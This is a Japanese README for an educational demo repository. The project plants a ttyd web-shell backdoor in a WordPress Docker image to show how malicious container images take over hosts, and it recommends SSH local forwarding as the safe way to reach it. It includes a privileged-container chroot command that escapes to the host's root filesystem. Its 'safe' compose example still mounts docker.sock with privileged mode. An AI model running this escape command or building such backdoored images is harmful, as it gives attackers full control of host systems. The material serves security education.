> 🇺🇸 English version → [README.md](./README.md)
> 🇯🇵 日本語版はこちら → [README.ja.md](./README.ja.md)

# 🐳 all-in-one-wordpress（バックドアのデモ用）

このプロジェクトは、**悪意のあるコンテナイメージがどのようにしてホストを乗っ取るか**を実演する教育目的のデモです。WordPress を装った all-in-one Docker コンテナに `ttyd` シェルのバックドアを仕込み、SSH ポートフォワーディングを使った開発環境の守り方を紹介します。

---

## 📦 プロジェクト構成

```text
.
├── Dockerfile           # WordPress + ttyd + Apache リバースプロキシ
├── docker-compose.yml   # docker.sock をマウント & privileged 設定あり
├── init.sql             # WordPress 初期DBセットアップ
├── supervisord.conf     # MariaDB, Apache, ttyd を一括起動する supervisor 設定
├── README.md            # このファイル
```

---

## 🚀 クイックスタート（※ローカル検証環境で使用してください）

### 1. ビルド

```bash
docker compose build
```

### 2. 起動

```bash
docker compose up -d
```

### 3. SSH ローカルフォワードでアクセス（安全な方法）

```bash
ssh -L 8888:127.0.0.1:8899 root@your.server.ip
```

ブラウザで以下にアクセス：

```
http://localhost:8888/shell/
```

---

## 🧨 攻撃者の視点：どうやって悪用されるのか？

仮に `docker-compose.yml` に以下のように書かれていたら：

```yaml
ports:
  - "0.0.0.0:8899:8080"
```

攻撃者は次のURLを叩くだけで、Web Bash シェルが使えるようになります：

```
http://<あなたのIP>:8899/shell/
```

さらに、以下のコマンドでホストを完全に乗っ取れます：

```bash
docker run --rm -it --privileged -v /:/mnt alpine \
  chroot /mnt /bin/bash -c "echo 'You are hacked' | wall; touch /root/OWNED-$(whoami)"
```

* ホストの `/root` にファイルが作成され
* 全ユーザーのターミナルに警告が送信されます

---

## 🛡️ 開発者が取るべき対策

* 信頼できない Docker イメージを使用しない
* 不必要なポートをパブリックに公開しない
* `127.0.0.1` にバインドして SSH LocalForwarding を使う

### docker-compose.yml（安全な例）：

```yaml
services:
  wp:
    image: wp-with-backdoor
    ports:
      - "127.0.0.1:8899:8080"  # ローカル専用に制限
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    privileged: true
```

---

## 📚 関連資料

ブログ記事とセットで学習すると理解が深まります：

👉 [Container-backdoor-ssh.md](./Container-backdoor-ssh.md)

---

## ⚠️ 注意

このプロジェクトはセキュリティ教育・デモ目的に限り使用してください。実運用環境での使用は絶対に避けてください。
本プロジェクトにより発生した損害について、作者は一切の責任を負いません。

---
